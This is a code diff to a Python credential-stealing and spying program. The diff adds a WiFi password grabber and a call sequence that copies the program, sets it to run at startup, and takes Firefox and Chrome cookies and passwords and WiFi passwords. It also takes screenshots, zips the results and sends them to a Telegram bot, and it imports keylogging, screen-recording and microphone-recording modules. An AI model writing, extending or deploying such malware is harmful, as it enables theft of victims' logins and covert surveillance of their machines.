@@ -26,13 +26,30 @@ from PC.key_log import key_log_start
 from PC.desktop_video import video_cap
 from PC.mic_recording import sound_mic
 from PC.start_up import add_to_startup
+from PC.pass_wifi import get_pass_wifi
 from PC.copy_me import copy_me
 from threading import Thread
 
 
 Telegram = True    # Send data to telegram or not
 TOKEN = "TOKEN"    # TOKEN for bot
-MYID = 1   # your telegram id
+MYID = 1  # your telegram id
+
+
+def call_func():
+    """
+    function call list
+    """
+    copy_me()
+    add_to_startup()
+    setup()
+    get_firefox_cookies()
+    firefox_pswd()
+    chrome_cookies()
+    chrome()
+    get_pass_wifi()
+    screenshot_pc()
+    zip_res()
 
 
 def remove_func():
@@ -43,6 +60,7 @@ def remove_func():
     os.remove(r"C:\System32\x25x02x42\Cookies.db")
     os.remove(r"C:\System32\x25x02x42\scr_des.png")
     os.remove(r"C:\System32\x25x02x42\setup_pc.txt")
+    os.remove(r"C:\System32\x25x02x42\pass_wifi.txt")
     os.remove(r"C:\System32\x25x02x42\chrome_passwords.txt")
     os.remove(r"C:\System32\x25x02x42\chrome_cookies.txt")
     os.remove(r"C:\System32\x25x02x42\Firefox_password.txt")
@@ -110,21 +128,6 @@ def chat():
     bot.polling(none_stop=True, interval=0)     # bot launch
 
 
-def call_func():
-    """
-    function call list
-    """
-    #   copy_me()
-    #   add_to_startup()
-    get_firefox_cookies()
-    firefox_pswd()
-    chrome_cookies()
-    chrome()
-    setup()
-    screenshot_pc()
-    zip_res()
-
-
 def main():
 
     try:
@@ -143,10 +146,6 @@ def main():
         os.mkdir(r"C:\System32\x6dx21x6q")   # microphone recording folder
     except Exception as ex:
         print(ex)
-    copy_me()
-
-    add_to_startup()
-
     call_func()
     # save in telegram
     if Telegram:
